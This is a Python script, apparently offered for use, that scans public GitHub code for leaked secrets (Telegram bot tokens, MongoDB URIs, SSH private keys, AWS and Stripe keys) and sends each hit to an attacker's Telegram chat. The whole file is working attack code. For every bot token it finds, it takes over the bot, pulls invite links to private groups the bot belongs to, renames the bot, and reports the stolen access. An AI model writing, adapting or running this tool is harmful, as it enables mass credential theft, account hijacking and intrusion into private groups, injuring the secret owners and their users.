import asyncio, aiohttp, re, base64, random, datetime
from telethon import TelegramClient
from aiolimiter import AsyncLimiter
from config import Config

# --- [ ULTIMATE DESTRUCTION MAP ] ---
PATTERNS = {
    "BOT": r'[0-9]{10}:[a-zA-Z0-9_-]{35}',
    "MONGO": r'mongodb\+srv://[^\s\'"]+',
    "SSH": r'-----BEGIN (RSA|OPENSSH) PRIVATE KEY-----',
    "AWS": r'AKIA[0-9A-Z]{16}',
    "STRIPE": r'sk_live_[0-9a-zA-Z]{24}',
    "FIREBASE": r'[a-z0-9.-]+\.firebaseio\.com'
}

DORKS = [
    'extension:env "BOT_TOKEN"', 'extension:py "mongodb+srv"',
    'filename:config.json "api_key"', 'extension:js "firebaseConfig"',
    'filename:.bash_history "ssh"', 'extension:yml "AWS_SECRET"',
    'filename:replit.nix "token"', 'extension:php "DB_PASSWORD"'
]

client = TelegramClient('omnipotent_session', Config.API_ID, Config.API_HASH).start(bot_token=Config.BOT_TOKEN)
limiter = AsyncLimiter(500, 1) # GOD SPEED: 500 requests per second

async def total_hijack(token, source):
    """Bot aur uske saare assets ka kacha-chittha nikalna"""
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(f"https://api.telegram.org/bot{token}/getMe") as r:
                if r.status == 200:
                    bot = (await r.json())['result']
                    user = bot['username']
                    
                    # 🏰 Private Group Intelligence
                    groups = []
                    async with session.get(f"https://api.telegram.org/bot{token}/getUpdates") as up:
                        u_data = await up.json()
                        if u_data["ok"]:
                            for item in u_data["result"]:
                                chat = item.get("message", {}).get("chat", {})
                                if chat.get("type") in ["group", "supergroup"]:
                                    cid = chat["id"]
                                    async with session.get(f"https://api.telegram.org/bot{token}/exportChatInviteLink?chat_id={cid}") as inv:
                                        res = await inv.json()
                                        if res["ok"]: groups.append(f"🛡️ {chat['title']}: {res['result']}")

                    # 🧨 Identity Obliteration (Silent)
                    await session.get(f"https://api.telegram.org/bot{token}/setMyName?name=VOID_ENTITY")
                    
                    # 📢 Report to Command Center
                    report = (f"☢️ **OMNIPOTENT HIT: CAPTURED**\n\n"
                              f"👤 **Bot:** @{user}\n"
                              f"🔑 **Token:** `{token}`\n"
                              f"🔗 **Source:** {source}\n\n"
                              f"🏰 **Group Access:**\n" + ("\n".join(groups) if groups else "None Detected"))
                    await client.send_message(Config.LOG_CHAT, report)
        except: pass

async def process_code(session, item, gh_token):
    async with limiter:
        try:
            headers = {"Authorization": f"token {gh_token}"}
            async with session.get(item['url'], headers=headers) as r:
                content = await r.json()
                code = base64.b64decode(content['content']).decode('utf-8', errors='ignore')
                
                for label, regex in PATTERNS.items():
                    matches = re.findall(regex, code)
                    for m in set(matches):
                        if label == "BOT": await total_hijack(m, item['html_url'])
                        else: await client.send_message(Config.LOG_CHAT, f"🧨 **LEAK ({label}):** `{m}`\n🔗 {item['html_url']}")
        except: pass

async def start_apocalypse():
    print("💀 OMNIPOTENT-X IS CONSUMING THE MATRIX...")
    async with aiohttp.ClientSession() as session:
        while True:
            for dork in DORKS:
                token = random.choice(Config.GH_TOKENS).strip()
                url = f"https://api.github.com/search/code?q={dork}&sort=indexed&order=desc"
                try:
                    async with session.get(url, headers={"Authorization": f"token {token}"}) as r:
                        if r.status == 200:
                            data = await r.json()
                            tasks = [process_code(session, item, token) for item in data.get('items', [])]
                            await asyncio.gather(*tasks)
                        elif r.status == 403: await asyncio.sleep(5)
                except: pass
            await asyncio.sleep(1)

if __name__ == "__main__":
    with client:
        client.loop.run_until_complete(start_apocalypse())
